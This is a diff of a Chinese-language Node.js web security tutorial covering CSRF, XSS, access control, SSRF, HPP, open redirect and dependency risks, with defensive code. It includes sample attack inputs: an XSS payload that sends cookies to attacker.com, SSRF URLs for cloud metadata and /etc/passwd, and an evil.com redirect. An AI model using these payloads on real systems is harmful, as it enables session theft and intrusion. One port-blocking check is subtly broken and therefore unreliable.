@@ -7,160 +7,639 @@ author: 'Max Zhang'
 date: '2026-03-10'
 ---
 
-## 引言：为什么安全如此重要？
+> 写给普通开发者的安全入门手册，看完再也不怕网站被黑
 
-现代 Web 应用面临各种各样的攻击。攻击者利用开发者的疏忽，通过精心构造的请求绕过防御。Node.js 作为后端主力，其安全性直接影响整个系统。下面我们从常见漏洞开始，每一部分都配有攻击流程图或原理示意图，帮助理解。
+你有没有想过这个问题：为什么有些网站会被"盗号"？为什么明明是自己的账号，别人却能帮你下单？为什么有些网站搞活动的时候突然就崩了？
 
-## 一、常见 Web 安全漏洞与防护
-
-### 1. CSRF（跨站请求伪造）
-
-**攻击原理**
-当用户已登录受信网站 A，攻击者诱导用户访问恶意网站 B，B 中的隐藏请求自动携带 A 的 Cookie 发往 A，执行非授权操作。
-
-**CSRF 攻击流程图**
-
-```mermaid
-sequenceDiagram
-    participant User
-    participant Browser
-    participant TrustedSite as 受信网站 A
-    participant MaliciousSite as 恶意网站 B
-
-    User->>TrustedSite: 登录
-    TrustedSite-->>Browser: 设置 Cookie
-    User->>MaliciousSite: 访问 B
-    MaliciousSite-->>Browser: 返回含隐藏表单的页面
-    Browser->>TrustedSite: 自动提交表单（携带 Cookie）
-    TrustedSite->>TrustedSite: 执行操作（改密码、转账等）
-```
-
-**防护**
-
-- CSRF 令牌
-- SameSite Cookie
-- 验证 Referer
-
-**Node.js 示例**（现代安全实践）
-
-在现代 Web 开发中，`csurf` 等传统中间件已不再推荐。建议通过以下组合拳实现防护：
-
-1.  **SameSite Cookie 属性**：将 Cookie 设置为 `SameSite=Lax` 或 `Strict`，从浏览器层面阻止跨站携带。
-2.  **双重 Cookie 校验 (Double Submit Cookie)**：前端读取签名 Cookie 并将其放入自定义 Header。
-3.  **框架内置防护**：如 Next.js 的 Server Actions 已内置 CSRF 校验。
-
-```javascript
-// 使用 Cookie 选项进行基础防御
-res.cookie('session', 'value', {
-  httpOnly: true,
-  secure: true, // 生产环境
-  sameSite: 'strict'
-});
-```
+这些问题背后，往往是安全漏洞在作怪。今天这篇文章，我用大白话给你讲清楚 Node.js 开发中最常见的安全问题，以及怎么防。全文包含大量图解和代码示例，保证小白也能看懂。
 
 ---
 
-### 2. XSS（跨站脚本攻击）
+## 引言：为什么安全这么重要？
 
-**XSS 分类图**
+做 Web 开发这么多年，我见过太多因为安全问题导致的惨案：
 
-```mermaid
-flowchart TD
-    XSS[XSS攻击] --> Reflected[反射型XSS]
-    XSS --> Stored[存储型XSS]
-    XSS --> DOM[DOM型XSS]
+- 某社交网站用户数据泄露，几千万用户信息被卖
+- 某电商平台被人疯狂刷券，损失几百万
+- 某公司数据库被拖，用户密码直接暴露
 
-    Reflected --> |URL参数直接回显| Example1[搜索页面显示关键词]
-    Stored --> |恶意代码存入数据库| Example2[评论区、留言板]
-    DOM --> |前端DOM操作导致脚本执行| Example3[使用innerHTML插入用户数据]
-```
+这些不是故事，是真实发生过的事情。Node.js 作为后端开发的主流技术栈之一，安全性直接决定了你的应用能不能守住最后一道防线。
 
-**反射型 XSS 流程**
+很多新手觉得"我这个小网站谁会来攻击"，但实际上黑客的扫描器是全自动的，24 小时不停扫描全网的漏洞。你的网站只要一上线，就会被无数机器人盯上。
+
+所以，安全不是"大公司才需要考虑的事"，而是每个开发者都必须掌握的基本功。
+
+下面我从最常见的几种漏洞说起，每一种都会讲到攻击原理、图解说明、以及怎么用代码防护。
+
+---
+
+## 一、CSRF：让人替你操作的陷阱
+
+### 1.1 什么是 CSRF？
+
+CSRF 的全称是 Cross-Site Request Forgery，翻译过来就是"跨站请求伪造"。
+
+这个漏洞的恶心之处在于：攻击者不需要知道你的密码，也不需要黑进你的账号，只需要诱导你点击一个链接，就能让你在不知情的情况下帮攻击者做事。
+
+举个例子：你登录了银行网站正准备转账，攻击者给你发了一封邮件，里面有个链接。你好奇点了一下，结果发现自己莫名其妙地给陌生人转了一笔钱。这就是 CSRF 攻击。
+
+### 1.2 攻击是怎么实现的？
+
+让我们用图来理解整个攻击流程：
 
 ```mermaid
 sequenceDiagram
-    participant Attacker
-    participant Victim
-    participant Server
+    participant User as 👤 普通用户
+    participant Browser as 🌐 浏览器
+    participant Bank as 🏦 银行网站
+    participant Evil as 😈 恶意网站
 
-    Attacker->>Victim: 发送恶意链接（含脚本）
-    Victim->>Server: 点击链接请求页面
-    Server-->>Victim: 返回包含脚本的页面
-    Victim->>Victim: 脚本执行，窃取Cookie
+    User->>Bank: 登录网上银行
+    Bank-->>Browser: 返回页面 + 设置 Cookie
+    Note over Browser: Cookie 已存储，包含登录凭证
+
+    User->>Evil: 收到一封邮件，点开链接
+    Evil-->>Browser: 返回一个隐藏了表单的页面
+    Note over Browser: 页面上有个隐藏的表单
+    Note over Browser: 表单会自动提交到银行
+
+    Browser->>Bank: 自动提交表单（携带银行 Cookie）
+    Bank->>Bank: 验证 Cookie 有效，执行转账操作
+    Note over Bank: 用户毫不知情就完成了转账！
 ```
 
-**防护**
+整个过程最阴险的地方在于：浏览器会自动带上目标网站的 Cookie，不管这个表单是不是来自目标网站。所以银行网站看到请求带着有效的 Cookie，就认为这是用户本人的操作。
 
-- 输入过滤（`xss` 库）
-- 输出转义（模板引擎默认转义）
-- CSP 头
+### 1.3 真实场景举例
+
+想象这样一个场景：
+
+1. 你在购物网站登录了账号
+2. 攻击者给你发送了一封邮件，里面有个链接："恭喜获得100元优惠券，点击领取"
+3. 你点开链接后，页面显示"优惠券已过期"
+4. 但实际上，攻击者的页面里有一个隐藏的表单，在你打开页面的瞬间自动提交，把你的收货地址改成了攻击者的地址
+5. 之后你下的订单全部发到攻击者那里去了
+
+可怕吗？整个过程你完全不知情，因为你看的是"优惠券过期"的页面，根本不知道背后发生了什么。
+
+### 1.4 怎么防护？
+
+**方法一：SameSite Cookie**
+
+这是浏览器提供的防护机制。只要在设置 Cookie 的时候加上 `SameSite` 属性，浏览器就不会在跨站请求中携带这个 Cookie。
+
+```javascript
+// 设置 Cookie 时的安全配置
+res.cookie('session', userSessionId, {
+	httpOnly: true, // 禁止 JavaScript 读取，防止 XSS 偷 Cookie
+	secure: true, // 只在 HTTPS 下传输，防止中间人攻击
+	sameSite: 'strict', // 完全禁止跨站携带，最严格
+	// 或者用 'lax'，在 GET 请求时允许跨站（用户体验更好但安全性略低）
+})
+```
+
+`SameSite` 有三个选项：
+
+- `Strict`：最严格，任何跨站请求都不带这个 Cookie，连链接都不行
+- `Lax`：相对宽松，GET 请求的链接会带 Cookie，但 POST 表单不行
+- `None`：不限制，但必须配合 `secure` 使用（HTTPS）
+
+**方法二：CSRF Token**
+
+在表单中加入一个随机生成的令牌，后端验证这个令牌才能处理请求。
+
+```javascript
+// 服务端：生成 Token
+app.get('/transfer', (req, res) => {
+	// 生成一个安全的随机令牌
+	const csrfToken = crypto.randomBytes(32).toString('hex')
+
+	// 存入 session 或 Redis
+	req.session.csrfToken = csrfToken
+
+	// 渲染表单，把 Token 放到隐藏字段里
+	res.render('transfer', { csrfToken })
+})
+```
+
+```html
+<!-- 前端：表单中包含 Token -->
+<form action="/transfer" method="POST">
+	<input type="hidden" name="csrfToken" value="{{csrfToken}}" />
+	<input type="text" name="amount" placeholder="转账金额" />
+	<button type="submit">转账</button>
+</form>
+```
+
+```javascript
+// 服务端：验证 Token
+app.post('/transfer', (req, res) => {
+	// 从表单获取 Token
+	const submittedToken = req.body.csrfToken
+
+	// 与 session 中存储的 Token 对比
+	if (submittedToken !== req.session.csrfToken) {
+		return res.status(403).json({ error: 'CSRF 验证失败' })
+	}
+
+	// Token 验证通过，继续处理业务
+	// ...
+})
+```
+
+**方法三：双重提交 Cookie**
+
+不用在服务端存储 Token，而是让前端 JavaScript 读取 Cookie 中的值，然后放到 Header 里。后端同时验证 Cookie 和 Header 的一致性。
+
+```javascript
+// 中间件：验证双重提交
+const csrfProtection = (req, res, next) => {
+	const cookieToken = req.cookies['csrf-token']
+	const headerToken = req.headers['x-csrf-token']
+
+	if (!cookieToken || !headerToken || cookieToken !== headerToken) {
+		return res.status(403).json({ error: 'CSRF 验证失败' })
+	}
+	next()
+}
+
+// 前端：发送请求时设置 Header
+fetch('/api/transfer', {
+	method: 'POST',
+	headers: {
+		'Content-Type': 'application/json',
+		'x-csrf-token': document.cookie.match(/csrf-token=([^;]+)/)?.[1],
+	},
+	body: JSON.stringify({ amount: 100 }),
+})
+```
+
+### 1.5 哪种方案最好？
+
+现代 Web 开发推荐组合使用：
+
+1. **SameSite Cookie**：浏览器自带防护，大部分情况下够用
+2. **CSRF Token**：敏感操作必备，如转账、修改密码
+3. **框架内置防护**：如果用 Next.js、Laravel 等框架，很多已经内置了 CSRF 防护
+
+不要完全依赖某一种方案，多层防护才是王道。
+
+---
+
+## 二、XSS：藏在页面里的定时炸弹
+
+### 2.1 什么是 XSS？
+
+XSS 的全称是 Cross-Site Scripting，翻成中文是"跨站脚本攻击"。重点在"脚本"两个字——攻击者想尽办法把恶意 JavaScript 代码植入到你的页面里。
+
+这个漏洞的可怕之处在于：恶意脚本在你自己的浏览器里运行，能访问你的 Cookie、localStorage，甚至可以冒充你在网站上操作。
+
+### 2.2 XSS 有哪几种？
+
+XSS 主要分三种类型，每种攻击方式都不一样：
+
+```mermaid
+flowchart TD
+    XSS[XSS 跨站脚本攻击] --> Reflected[📡 反射型 XSS]
+    XSS --> Stored[💾 存储型 XSS]
+    XSS --> DOM[🖥️ DOM 型 XSS]
+
+    Reflected --> R1[攻击方式]
+    R1 --> R2["URL 参数直接拼接到页面"]
+    R2 --> R3["常见于搜索框，显示你搜索的关键词"]
+
+    Stored --> S1[攻击方式]
+    S1 --> S2["恶意代码存入数据库"]
+    S2 --> S3["每次打开页面都会执行，如评论区、留言板"]
+
+    DOM --> D1[攻击方式]
+    D1 --> D2["前端 JS 使用 innerHTML 插入用户数据"]
+    D2 --> D3["纯前端处理，后端可能完全不知情"]
+```
+
+#### 反射型 XSS：昙花一现
+
+这种是最常见的 XSS 类型。恶意代码在 URL 参数里，服务器把参数原封不动地返回给浏览器，浏览器执行了这段代码。
+
+```mermaid
+sequenceDiagram
+    participant Attacker as 😈 攻击者
+    participant Victim as 👤 受害者
+    participant Server as 🖥️ 服务器
+
+    Attacker->>Victim: 发送恶意链接
+    Note over Attacker: "https://shop.com/search?q=<script>alert('xss')</script>"
+
+    Victim->>Server: 点击链接，访问搜索页
+    Server-->>Victim: 返回搜索结果页面
+    Note over Victim: 页面显示：您搜索的关键词是 <script>alert('xss')</script>
+    Note over Victim: 浏览器执行了 script 标签，弹出警告框
+
+    Victim->>Victim: 脚本执行完成
+```
+
+#### 存储型 XSS：潜伏的毒瘤
+
+这种最危险。恶意代码被存到了数据库里，每个访问这个数据的用户都会中招。
+
+典型场景：
+
+- 论坛帖子、评论区
+- 用户签名、昵称
+- 文章标题（有些系统会直接显示在页面上）
+
+想象一下：你在一个技术论坛回复了一个帖子，内容是：`<img src=x onerror="fetch('http://attacker.com?cookie='+document.cookie)">`
+
+从此以后，每个打开这个帖子的人，他们的 Cookie 都会自动发送到攻击者的服务器。这不是一次性的，是持续性的伤害。
+
+#### DOM 型 XSS：纯前端的陷阱
+
+这种 XSS 完全发生在浏览器端，跟后端没关系。
+
+```javascript
+// 前端代码：获取 URL 参数并显示
+const params = new URLSearchParams(window.location.search)
+const name = params.get('name')
+document.getElementById('welcome').innerHTML = '欢迎，' + name
+```
+
+攻击者构造这样的 URL：`http://example.com?name=<img src=x onerror=alert(document.cookie)>`
+
+当受害者打开这个链接，JavaScript 会获取到包含恶意代码的 name 参数，然后用 innerHTML 插入到页面。浏览器解析 HTML 的时候就会执行 onerror 里的脚本。
+
+### 2.3 XSS 能造成什么危害？
+
+很多人觉得"弹出个 alert 框有什么大不了的"，但实际上 XSS 的危害远不止于此：
+
+1. **Cookie 盗取**：读取用户的登录凭证，冒充用户操作
+2. **键盘记录**：监听用户输入的密码、银行卡号
+3. **页面篡改**：修改页面内容，进行钓鱼诈骗
+4. **挖矿攻击**：在页面里嵌入挖矿代码，利用用户电脑挖加密货币
+5. **蠕虫传播**：自动把你的恶意链接分享给所有好友
+
+### 2.4 怎么防护？
+
+**原则一：永远不要相信用户输入**
+
+不管数据来自哪里——URL 参数、表单提交、数据库——都要当作可能是恶意的来处理。
+
+**原则二：输出时转义，不要在插入 HTML 之前转义**
+
+```javascript
+// 错误的做法：直接插入用户输入
+element.innerHTML = userInput // 危险！
+
+// 正确的做法：使用 textContent 而不是 innerHTML
+element.textContent = userInput // 安全
+
+// 如果必须使用 innerHTML，先转义
+function escapeHtml(text) {
+	const div = document.createElement('div')
+	div.textContent = text
+	return div.innerHTML
+}
+element.innerHTML = escapeHtml(userInput)
+```
+
+**后端使用 xss 库过滤：**
 
 ```javascript
 import xss from 'xss'
-const clean = xss(userInput)
+
+// 白名单过滤：只允许部分标签
+const clean = xss(userInput, {
+	whiteList: {
+		p: ['class'],
+		strong: [],
+		em: [],
+		a: ['href', 'title'],
+	},
+})
 ```
 
----
-
-### 3. 越权漏洞
-
-**水平越权与垂直越权**
-
-```mermaid
-flowchart TD
-    subgraph 水平越权
-        A[用户A] -- 访问 --> B[用户B的资源]
-    end
-    subgraph 垂直越权
-        C[普通用户] -- 访问 --> D[管理员功能]
-    end
-```
-
-**典型场景**
-
-- URL 中包含可猜测的 ID：`/order/1001`，攻击者遍历 ID 查看他人订单。
-- 管理后台未校验权限：`/admin/deleteUser` 被普通用户访问。
-
-**防护**
-
-- 从 session 获取当前用户 ID，与资源所有者比对。
-- 使用 UUID 替代自增 ID。
-- 登录态过期后清除客户端信息。
+**后端设置 CSP（内容安全策略）：**
 
 ```javascript
-app.get('/order/:id', async (req, res) => {
-	const order = await Order.findById(req.params.id)
-	if (order.userId !== req.session.userId) {
-		return res.status(403).end()
+import helmet from 'helmet'
+
+app.use(
+	helmet.contentSecurityPolicy({
+		directives: {
+			defaultSrc: ["'self'"],
+			scriptSrc: ["'self'", "'nonce-{generated-csp-nonce}'"],
+			styleSrc: ["'self'", "'unsafe-inline'"], // 注意：尽量不用 unsafe-inline
+			imgSrc: ["'self'", 'https:'], // 只允许同源和 HTTPS 图片
+			connectSrc: ["'self'"],
+			fontSrc: ["'self'"],
+			objectSrc: ["'none'"],
+			mediaSrc: ["'self'"],
+			frameSrc: ["'none'"],
+		},
+	}),
+)
+```
+
+### 2.5 完整防护示例
+
+结合前端和后端的完整防护：
+
+```javascript
+// 后端 Express 服务
+import express from 'express'
+import xss from 'xss'
+import helmet from 'helmet'
+
+const app = express()
+
+// 1. 使用 helmet 设置安全头
+app.use(helmet())
+
+// 2. 全局 XSS 过滤中间件
+app.use((req, res, next) => {
+	// 对所有请求参数进行转义
+	const sanitize = (obj) => {
+		if (typeof obj === 'string') {
+			return xss(obj)
+		}
+		if (typeof obj === 'object' && obj !== null) {
+			for (const key in obj) {
+				obj[key] = sanitize(obj[key])
+			}
+		}
+		return obj
 	}
-	res.json(order)
+
+	req.body = sanitize(req.body)
+	req.query = sanitize(req.query)
+	req.params = sanitize(req.params)
+	next()
+})
+
+// 3. 安全的模板渲染
+app.set('view engine', 'ejs')
+app.locals.xss = xss // 在模板中可以调用
+
+// 路由示例
+app.post('/comment', async (req, res) => {
+	const { content } = req.body
+
+	// 存入数据库前再次转义
+	const safeContent = xss(content)
+	await db.comments.insert({ content: safeContent })
+
+	res.json({ success: true })
 })
 ```
 
 ---
 
-### 4. SSRF（服务器端请求伪造）
+## 三、越权漏洞：不该看到的看到了
 
-**SSRF 攻击路径**
+### 3.1 什么是越权？
+
+越权漏洞分两种：水平越权和垂直越权。
+
+**水平越权**：你能访问到跟你同级别用户的资源。
+
+比如你和同学都是普通用户，你登录后看到自己的订单详情，但改成同学的订单 ID 后，居然也能看到他的订单内容。这就是水平越权。
+
+**垂直越权**：你能访问到你没权限的功能。
+
+比如你是普通用户，但直接访问 `/admin/dashboard` 居然能看到管理员后台，这就是垂直越权。
 
 ```mermaid
 flowchart TD
-    Attacker[攻击者] -->|构造恶意URL| App[Node.js应用]
-    App -->|发起请求| Internal[内网服务<br>（如数据库、管理后台）]
-    Internal -->|返回敏感数据| App
-    App --> Attacker
+    subgraph 水平越权["🔄 水平越权（同级别权限互换）"]
+        A[👤 用户 A] -->|查看自己订单| O1[📋 订单 123]
+        A -->|错误：访问| O2[📋 订单 456]
+        B[👤 用户 B] -->|拥有| O2
+        NoteAB[本来只能看自己的]
+    end
+
+    subgraph 垂直越权["⬆️ 垂直越权（低权限访问高权限）"]
+        C[👤 普通用户] -->|访问| N1[❌ 普通功能]
+        C -->|错误：访问| D1[🔐 管理后台]
+        D[👑 管理员] -->|合法访问| D1
+        NoteCD[普通用户不该能看到后台入口]
+    end
 ```
 
-**常见功能点**
+### 3.2 越权的常见场景
 
-- 图片下载：用户输入图片 URL，服务器获取后存储。
-- 网页截图、代理抓取。
-- Webhook 回调。
+**场景一：URL 参数包含用户 ID**
 
-**防护**
+```javascript
+// 常见的问题代码
+app.get('/user/profile/:userId', async (req, res) => {
+	const userId = req.params.userId
+	const profile = await db.user.findById(userId)
+	res.json(profile)
+})
+```
 
-- 解析 URL 获取 IP，禁止内网 IP（127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16）。
-- 白名单域名。
+攻击者只需要遍历 userId 参数，就能看到任意用户的信息。
+
+**场景二：管理接口没有权限校验**
+
+```javascript
+// 常见的问题代码
+app.post('/admin/deleteUser', async (req, res) => {
+	const { userId } = req.body
+	await db.user.delete(userId)
+	res.json({ success: true })
+})
+```
+
+普通用户 POST 到这个地址就能删除任意用户。
+
+**场景三：隐藏接口靠"不知名"来保护**
+
+```javascript
+// 以为改了名字就安全了？太天真了
+app.post('/manage/delete-account', async (req, res) => {
+	// 没有任何权限检查
+	await db.user.delete(req.body.id)
+})
+```
+
+### 3.3 怎么防护？
+
+**核心原则：从 session 获取当前用户，不要相信前端传来的用户标识**
+
+```javascript
+// ✅ 正确的做法：从 session 获取当前用户
+app.get('/order/:orderId', async (req, res) => {
+	const orderId = req.params.orderId
+
+	// 1. 先获取当前登录用户
+	const currentUser = req.session.userId
+
+	// 2. 查询订单
+	const order = await db.order.findById(orderId)
+
+	// 3. 验证订单主人是不是当前用户
+	if (order.userId !== currentUser) {
+		return res.status(403).json({
+			error: '你无权访问这个订单',
+		})
+	}
+
+	res.json(order)
+})
+```
+
+**使用 UUID 代替自增 ID：**
+
+```javascript
+// ❌ 自增 ID，容易被遍历
+// GET /order/1001, /order/1002, /order/1003...
+
+// ✅ UUID，无法猜测
+// GET /order/a1b2c3d4-e5f6-7890-abcd-ef1234567890
+```
+
+```javascript
+// 生成 UUID
+import { v4 as uuidv4 } from 'uuid'
+
+app.post('/order', async (req, res) => {
+	const order = {
+		id: uuidv4(), // 随机 UUID
+		userId: req.session.userId,
+		items: req.body.items,
+		createdAt: new Date(),
+	}
+
+	await db.order.insert(order)
+	res.json({ orderId: order.id })
+})
+```
+
+**全局权限检查中间件：**
+
+```javascript
+// 定义权限检查函数
+function requireAuth(allowedRoles = []) {
+	return async (req, res, next) => {
+		// 检查是否登录
+		if (!req.session.userId) {
+			return res.status(401).json({ error: '请先登录' })
+		}
+
+		// 获取用户信息
+		const user = await db.user.findById(req.session.userId)
+
+		// 检查角色权限
+		if (allowedRoles.length > 0 && !allowedRoles.includes(user.role)) {
+			return res.status(403).json({ error: '你没有权限访问此功能' })
+		}
+
+		// 把用户信息挂到 req 上，后续处理器可以直接用
+		req.user = user
+		next()
+	}
+}
+
+// 使用方式
+app.get(
+	'/admin/dashboard',
+	requireAuth(['admin']), // 只有管理员能访问
+	(req, res) => {
+		res.json({ message: '欢迎来到管理后台' })
+	},
+)
+
+app.get(
+	'/order/:id',
+	requireAuth(), // 登录用户就能访问（但只能访问自己的）
+	async (req, res) => {
+		// 这里还需要额外检查资源所有权
+		const order = await db.order.findById(req.params.id)
+		if (order.userId !== req.user.id) {
+			return res.status(403).json({ error: '无权访问' })
+		}
+		res.json(order)
+	},
+)
+```
+
+---
+
+## 四、SSRF：被利用的"代理"功能
+
+### 4.1 什么是 SSRF？
+
+SSRF 的全称是 Server-Side Request Forgery，翻译过来是"服务器端请求伪造"。
+
+这个漏洞的本质是：你的服务器上有一些需要"获取外部资源"的功能（比如抓取图片、网页截图），攻击者利用这些功能，让服务器去访问本来不该访问的内网资源。
+
+### 4.2 攻击原理
+
+正常情况下，用户输入一个图片 URL，服务器下载并保存：
+
+```mermaid
+flowchart TD
+    User[👤 用户] -->|输入图片 URL| App[🖥️ Node.js 应用]
+    App -->|下载图片| External[🌐 外部网站]
+    External -->|返回图片| App
+    App -->|保存图片| Storage[💾 存储]
+```
+
+攻击者利用这个功能，让应用去访问内网资源：
+
+```mermaid
+sequenceDiagram
+    participant Attacker as 😈 攻击者
+    participant App as 🖥️ Node.js 应用
+    participant Internal as 🔒 内网服务
+
+    Attacker->>App: 输入恶意 URL
+    Note over App,Internal: "URL: http://192.168.1.100/admin"
+    App->>Internal: 下载"图片"
+    Internal-->>App: 返回内部管理界面
+    App-->>Attacker: 暴露敏感数据
+    Note over Attacker: 成功获取内网敏感数据！
+```
+
+### 4.3 哪些功能容易中招？
+
+- **图片预览/缩略图**：用户输入图片 URL，服务器下载处理
+- **网页截图**：把任意 URL 转成图片
+- **文件下载**：允许用户下载指定 URL 的文件
+- **Webhook 回调**：把用户提供的 URL 发请求
+- **API 代理**：代理访问用户提供的 URL
+
+### 4.4 真实攻击案例
+
+**案例一：读取云服务元数据**
+
+很多云服务（AWS、阿里云）都有元数据服务，运行在 `169.254.169.254`：
+
+```
+http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
+```
+
+如果你的应用没有防护，攻击者就能拿到云服务器的密钥、实例信息等。
+
+**案例二：探测内网端口**
+
+```
+http://example.com/fetch?url=http://192.168.1.1:8080/
+```
+
+通过返回的内容判断端口是否开放，服务类型是什么。
+
+**案例三：读取本地文件**
+
+```
+http://example.com/fetch?url=file:///etc/passwd
+```
+
+有些服务器支持 `file://` 协议，直接读取本地文件。
+
+### 4.5 怎么防护？
+
+**方法一：禁止内网 IP**
 
 ```javascript
 import dns from 'node:dns/promises'
@@ -168,308 +647,759 @@ import { isInternal } from 'is-internal-ip'
 
 app.post('/fetch', async (req, res) => {
 	const { url } = req.body
-	const hostname = new URL(url).hostname
-	const ips = await dns.lookup(hostname, { all: true })
-	for (const ip of ips) {
-		if (await isInternal(ip.address)) {
-			return res.status(400).send('内网地址禁止访问')
+
+	try {
+		// 解析域名获取 IP
+		const urlObj = new URL(url)
+		const hostname = urlObj.hostname
+
+		// 检查是否是内网域名（如 localhost、*.local）
+		if (hostname === 'localhost' || hostname.endsWith('.local')) {
+			return res.status(400).json({ error: '禁止访问本地资源' })
 		}
+
+		// 获取域名的所有 IP
+		const records = await dns.lookup(hostname, { all: true })
+
+		// 检查是否有内网 IP
+		for (const record of records) {
+			if (await isInternal(record.address)) {
+				return res.status(400).json({ error: '禁止访问内网资源' })
+			}
+		}
+
+		// 验证通过，继续处理
+		const response = await fetch(url)
+		const buffer = await response.arrayBuffer()
+		res.send(Buffer.from(buffer))
+	} catch (error) {
+		res.status(400).json({ error: 'URL 格式错误或无法访问' })
 	}
-	// 发起请求...
 })
 ```
 
+**方法二：白名单域名**
+
+```javascript
+const ALLOWED_DOMAINS = ['cdn.example.com', 'images.example.com', 'img.example.org']
+
+app.post('/fetch', async (req, res) => {
+	const { url } = req.body
+	const urlObj = new URL(url)
+
+	if (!ALLOWED_DOMAINS.includes(urlObj.hostname)) {
+		return res.status(400).json({ error: '只允许访问指定域名' })
+	}
+
+	// ...
+})
+```
+
+**方法三：禁用危险协议**
+
+```javascript
+app.post('/fetch', async (req, res) => {
+	const { url } = req.body
+
+	// 只允许 http 和 https
+	if (!url.startsWith('http://') && !url.startsWith('https://')) {
+		return res.status(400).json({ error: '只支持 http 和 https 协议' })
+	}
+
+	// 禁止内网常见端口
+	const suspiciousPorts = [22, 23, 25, 3306, 5432, 6379, 27017]
+	const urlObj = new URL(url)
+	if (suspiciousPorts.includes(urlObj.port)) {
+		return res.status(400).json({ error: '禁止访问该端口' })
+	}
+
+	// ...
+})
+```
+
+**方法四：使用 DNS rebinding 防护**
+
+攻击者可能利用 DNS 缓存时间差，在验证时解析到合法 IP，但实际请求时指向内网 IP。可以结合 IP 黑名单和时间戳验证。
+
 ---
 
-### 5. HPP（HTTP参数污染）
+## 五、其他常见漏洞
 
-**参数污染示例**
-`GET /search?q=apple&q=banana`
-不同服务器解析可能得到不同结果：
+### 5.1 HPP - HTTP 参数污染
 
-- PHP: `q=banana`（后一个覆盖）
-- Asp.net: `q=apple,banana`（逗号拼接）
-- Node.js (Express): `q='banana'`（后一个覆盖）
+HPP 是 HTTP Parameter Pollution 的缩写，中文叫"参数污染"。
 
-攻击者可利用解析差异绕过安全过滤。
+问题在于：不同的后端框架对重复参数的处理方式不一样。
 
-**防护**
-使用 `hpp` 中间件清除同名参数。
+```
+GET /search?q=apple&q=banana
+```
+
+| 框架       | 结果                         |
+| ---------- | ---------------------------- |
+| PHP        | `q = "banana"`（后者覆盖）   |
+| ASP.NET    | `q = "apple,banana"`（拼接） |
+| Express.js | `q = "banana"`（后者覆盖）   |
+
+攻击者可以利用这种差异绕过安全过滤。比如某安全检查只验证第一个参数，但实际使用的是第二个。
+
+**防护：使用 hpp 中间件**
 
 ```javascript
 import hpp from 'hpp'
-app.use(hpp())
+
+app.use(
+	hpp({
+		// 可以指定哪些参数允许重复
+		allow: ['tags', 'category'],
+	}),
+)
+
+// 现在 /search?q=apple&q=banana 会被 hpp 处理
+// 只保留最后一个：q = "banana"
 ```
 
----
+### 5.2 开放式重定向
 
-### 6. 不安全的跳转（Open Redirect）
+很多网站有"登录后跳转"功能，比如：
 
-**钓鱼流程**
+```
+https://shop.com/login?redirect=/cart
+```
+
+登录成功后会自动跳转到 `/cart`。但如果 `redirect` 参数可以被控制：
+
+```
+https://shop.com/login?redirect=http://evil.com/phishing
+```
+
+攻击者可以用这个做钓鱼——看起来是你信任的网站，实际上跳到了假网站。
+
+**攻击流程：**
 
 ```mermaid
 sequenceDiagram
-    Attacker->>Victim: 发送伪装链接<br>https://trusted.com/logout?redirect=http://evil.com
-    Victim->>Trusted: 点击链接
-    Trusted-->>Victim: 302 跳转到 http://evil.com
-    Victim->>Evil: 访问钓鱼页面
+    participant Victim as 👤 受害者
+    participant Real as 🎭 真实网站
+    participant Phishing as 🎣 钓鱼网站
+
+    Victim->>Real: 打开重定向链接
+    Real-->>Victim: 302 跳转到钓鱼网站
+    Note over Victim: 看起来还是 shop.com 的域名
+    Victim->>Phishing: 在钓鱼页面输入账号密码
+    Phishing->>Phishing: 记录账号密码
+    Phishing->>Real: 真正登录，获取 cookie
 ```
 
-**防护**
-白名单验证跳转域名，或只允许相对路径。
+**防护：白名单验证**
 
 ```javascript
-const allowedHosts = ['example.com']
-app.get('/redirect', (req, res) => {
-	const target = req.query.url
-	const { hostname } = new URL(target, 'http://localhost') // 第二个参数用于解析相对路径
-	if (!allowedHosts.includes(hostname)) {
-		return res.status(400).send('非法跳转')
+const ALLOWED_HOSTS = ['example.com', 'shop.example.com']
+
+app.get('/login', (req, res) => {
+	const redirectUrl = req.query.redirect
+
+	if (!redirectUrl) {
+		return res.redirect('/dashboard')
 	}
-	res.redirect(target)
+
+	// 解析 URL
+	let hostname
+	try {
+		const url = new URL(redirectUrl, 'http://localhost')
+		hostname = url.hostname
+	} catch {
+		return res.redirect('/dashboard')
+	}
+
+	// 检查是否在白名单
+	if (!ALLOWED_HOSTS.includes(hostname)) {
+		return res.redirect('/dashboard')
+	}
+
+	// 检查是否相对路径（推荐做法）
+	if (redirectUrl.startsWith('/') && !redirectUrl.startsWith('//')) {
+		return res.redirect(redirectUrl)
+	}
+
+	res.redirect('/dashboard')
 })
 ```
 
----
+### 5.3 依赖漏洞
 
-### 7. 依赖漏洞
+你以为只用原生 Node.js 就安全了？Too young too simple。
 
-**攻击链**
+npm 生态有几百万个包，你一个项目装几十个依赖，每个依赖又可能依赖几十个包。一层层加上去，你的项目实际上依赖了几百上千个第三方代码。
 
-```mermaid
-flowchart TD
-    A[开发者] -->|引入恶意/脆弱npm包| B[Node.js应用]
-    B -->|运行时调用漏洞代码| C[攻击者利用漏洞]
-    C -->|执行任意命令/窃取数据| D[服务器被控制]
-```
+这些代码的安全性完全取决于作者。一旦某个包被发现漏洞，你的项目也就危险了。
 
-**防护**
-
-- `npm audit` 定期检查。
-- 使用 Snyk、Dependabot 自动修复。
-- 锁定版本，避免语义版本自动升级引入恶意包。
-
----
-
-### 8. 目录遍历
-
-**路径遍历示例**
+**攻击链：**
 
 ```mermaid
 flowchart TD
-    Request["GET /download?file=../../../etc/passwd"] --> App["Node.js应用"]
-    App -->|"直接拼接路径"| FS["fs.readFile('../../../etc/passwd')"]
-    FS -->|"读取系统文件"| Return["返回敏感内容"]
+    A[👤 开发者] -->|引入有漏洞的包| B[📦 npm 依赖]
+    B -->|运行时执行| C[⚠️ 漏洞代码]
+    C -->|利用漏洞| D[💀 系统沦陷]
+
+    A2[👤 开发者] -->|引入恶意包| E[😈 恶意代码]
+    E -->|偷窃数据| F[🔓 敏感信息泄露]
 ```
 
-**防护**
-使用 `path.resolve` 并检查是否在预期目录内。
+**真实案例：**
+
+2018 年的 event-stream 事件。攻击者向热门包 event-stream 注入了恶意代码，专门窃取比特币钱包的私钥。全球数百万项目受到影响。
+
+**防护措施：**
+
+1. **定期审计**
+
+```bash
+# 检查依赖漏洞
+npm audit
+
+# 查看详细报告
+npm audit --audit-level=high
+```
+
+2. **使用自动化工具**
+
+```yaml
+# .github/workflows/security.yml
+name: Security Audit
+on: [push, pull_request]
+
